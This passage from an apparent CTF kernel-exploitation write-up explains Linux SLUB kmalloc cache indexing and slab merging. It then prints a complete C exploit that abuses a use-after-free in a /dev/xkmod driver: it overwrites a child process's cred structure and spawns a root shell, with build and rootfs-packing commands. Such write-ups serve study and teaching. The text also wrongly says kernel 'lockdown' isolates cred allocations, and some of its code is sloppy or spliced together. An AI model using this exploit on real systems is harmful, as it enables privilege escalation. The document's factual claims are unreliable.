The `create_kmalloc_caches` function creates some `slab descriptors ` when system boots.

```
static __always_inline void *kmalloc(size_t size, gfp_t flags)
{
 if (__builtin_constant_p(size)) {
  if (size > KMALLOC_MAX_CACHE_SIZE)
   return kmalloc_large(size, flags);
#ifndef CONFIG_SLOB
  if (!(flags & GFP_DMA)) {
   unsigned int index = kmalloc_index(size);


   if (!index)
    return ZERO_SIZE_PTR;


   return kmem_cache_alloc_trace(kmalloc_caches[index],
     flags, size);
  }
#endif
 }
 return __kmalloc(size, flags);
}


    /*
     * Initialize the caches that provide memory for the  kmem_cache_node
     * structures first.  Without this, further allocations will bug.
     */
    kmalloc_caches[INDEX_NODE] = create_kmalloc_cache("kmalloc-node",
                kmalloc_size(INDEX_NODE), ARCH_KMALLOC_FLAGS);
    slab_state = PARTIAL_NODE;
    setup_kmalloc_cache_index_table();

    slab_early_init = 0;

```

The function determines which `cache` the final allocated memory comes from based on the `index` in the code above.

```
static __always_inline unsigned int kmalloc_index(size_t size)
{
 if (!size)
  return 0;


 if (size <= KMALLOC_MIN_SIZE)
  return KMALLOC_SHIFT_LOW;


 if (KMALLOC_MIN_SIZE <= 32 && size > 64 && size <= 96)
  return 1;
 if (KMALLOC_MIN_SIZE <= 64 && size > 128 && size <= 192)
  return 2;
 if (size <= 8) return 3;
 if (size <= 16) return 4;
 if (size <= 32) return 5;
 if (size <= 64) return 6;
 if (size <= 128) return 7;
 if (size <= 256) return 8;
 if (size <= 512) return 9;
 if (size <= 1024) return 10;
 if (size <= 2 * 1024) return 11;
 if (size <= 4 * 1024) return 12;
 if (size <= 8 * 1024) return 13;
 if (size <= 16 * 1024) return 14;
 if (size <= 32 * 1024) return 15;
 if (size <= 64 * 1024) return 16;
 if (size <= 128 * 1024) return 17;
 if (size <= 256 * 1024) return 18;
 if (size <= 512 * 1024) return 19;
 if (size <= 1024 * 1024) return 20;
 if (size <= 2 * 1024 * 1024) return 21;
 if (size <= 4 * 1024 * 1024) return 22;
 if (size <= 8 * 1024 * 1024) return 23;
 if (size <= 16 * 1024 * 1024) return 24;
 if (size <= 32 * 1024 * 1024) return 25;
 if (size <= 64 * 1024 * 1024) return 26;
 BUG();


 /* Will never be reached. Needed because the compiler may complain */
 return -1;
}
```

##### How to merge

```cpp
【file:/mm/slub.c】
static struct kmem_cache *find_mergeable(struct mem_cgroup *memcg, size_t size,
		size_t align, unsigned long flags, const char *name,
		void (*ctor)(void *))
{
	struct kmem_cache *s;

	if (slub_nomerge || (flags & SLUB_NEVER_MERGE))
		return NULL;

	if (ctor)
		return NULL;

	size = ALIGN(size, sizeof(void *));
	align = calculate_alignment(flags, align, size); 
	size = ALIGN(size, align);
	flags = kmem_cache_flags(size, flags, name, NULL); 

	list_for_each_entry(s, &slab_caches, list) { 
		if (slab_unmergeable(s)) 
			continue;

		if (size > s->size) 
			continue;

		if ((flags & SLUB_MERGE_SAME) != (s->flags & SLUB_MERGE_SAME)) 
				continue;
		/*
		 * Check if alignment is compatible.
		 * Courtesy of Adrian Drzewiecki
		 */
		if ((s->size & ~(align - 1)) != s->size) 
			continue;

		if (s->size - size >= sizeof(void *)) 
			continue;

		if (!cache_match_memcg(s, memcg)) 
			continue;

		return s;
	}
	return NULL;
}
```

The above function first gets the memory alignment value for the slab to be created and creates the memory identity for the `slab`.

Then the entire `slab_caches` linked list is traversed by the `list_for_each_entry()` function.

The `slab_unmergeable()` function determines whether the `kmem_cache` being traversed is allowed to be merged.

Analysis of the Merge:

- The main purpose is to determine if a specific initialization constructor is using the identifier of the buffer property and the object of the slab  and skipping it if merging is not allowed.

- And then, this function determines whether the object's size in the current `kmem_cache` is smaller than the one to be found and skips it if it is smaller.

- `if ((flags & SLUB_MERGE_SAME) != (s->flags &SLUB_MERGE_SAME))  `   it determines whether the current `kmem_cache` matches the `flag type`, and skips if it does not.

- `if ((s->size & ~(align – 1)) != s->size)`  It is used to determine if the alignment matches.
- `if (s->size – size >= sizeof(void *))`  It is used to determine whether the size difference exceeds the size of the pointer type.

- `if (!cache_match_memcg(s, memcg))`It is used to determine whether `memcg` can be matched or not. The original function is returned through multiple judgment checks if a mergeable slab is found;otherwise,`NULL` is returned.

- `kmem_cache_create_memcg() `If the function `__kmem_cache_alias() `finds a slab that can be merged, it will return its `kmem_cache` structure as a return value, otherwise it will create a new slab.

#### Extension

In the new version of the kernel, this attack method is invalid because the cred structure of the new process will have a separate area for application, so a hacker cannot successfully exploit the UAF vulnerability. This new feature is called lockdown.  For details, please refer to [lockdown ](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=aefcf2f4b58155d27340ba5f9ddbe9513da8286d).

### Exp Generation

````
#include <stdio.h>
#include <sys/types.h>
#include <sys/io.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <wait.h>

struct param
{
    void *ptr;
    int start;
    int len;
};
struct param *p;

void alloc(int fd)
{
    ioctl(fd, 0x1111111, p);
}

void rd(int fd)
{
    ioctl(fd, 0x7777777, p);
}

void wt(int fd)
{
    ioctl(fd, 0x6666666, p);
}

int main(int argc, char const *argv[]){
	int fd1 = open("/dev/xkmod", O_RDONLY);
	int fd2 = open("/dev/xkmod", O_RDONLY);
	if(fd1 < 0){
		puts("[*]open error!");
        exit(0);
	}
	puts("[*]alloc from cache");
	
	p = malloc(sizeof(struct param));
	p->ptr = malloc(0x100);
	alloc(fd1);
    close(fd1);
    
    int pid = fork();
    if (pid < 0)
    {
        puts("[*]fork error!");
        exit(0);
    }
    if (pid == 0)
    {
		puts("[*]this is child process!");
		memset(p->ptr, 0, sizeof(p->ptr));
        p->start = 0;
        p->len = 0x28;
        wt(fd2);
        system("/bin/sh");
        exit(0);
	}else
    {
        puts("[*]this is child process!");
        int status;
        wait(&status);
    }

    return 0;
}
````

```
gcc exp.c -g -static -o exp
chmod +x exp
cp exp rootfs/
#pack
cd rootfs
find . | cpio -o --format=newc > ../rootfs.cpio
```

According to the `ioctl` command, we can write `interactive functions`

```
void alloc(int fd)
{
    ioctl(fd, 0x1111111, p);
}

void rd(int fd)
{
    ioctl(fd, 0x7777777, p);
}

void wt(int fd)
{
    ioctl(fd, 0x6666666, p);
}
```



## References

[1] https://mp.weixin.qq.com/s/v9_C43Qh9qXr9tYojrZKgQ

[2] https://xz.aliyun.com/t/11053

[3] https://mudongliang.github.io/2022/01/18/ciscn2017-babydriver.html

[4]https://github.com/g0dA/linuxStack/blob/master/%E5%85%B3%E4%BA%8E%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D%E7%9A%84%E4%B8%80%E4%BA%9B%E4%BA%8B.md

[5]段鑫峰. 面向Linux内核空间的内存分配隔离方法的研究与实现[D].北京交通大学,2021.DOI:10.26944/d.cnki.gbfju.2021.000664.

[6] https://www.anquanke.com/post/id/259252#h2-6

[7] https://zhuanlan.zhihu.com/p/490588193

[8] https://kernel.blog.csdn.net/article/details/52705552

[9] https://www.jeanleo.com/2018/09/07/%E3%80%90linux%E5%86%85%E5%AD%98%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E3%80%91slub%E5%88%86%E9%85%8D%E7%AE%97%E6%B3%95%EF%BC%883%EF%BC%89/
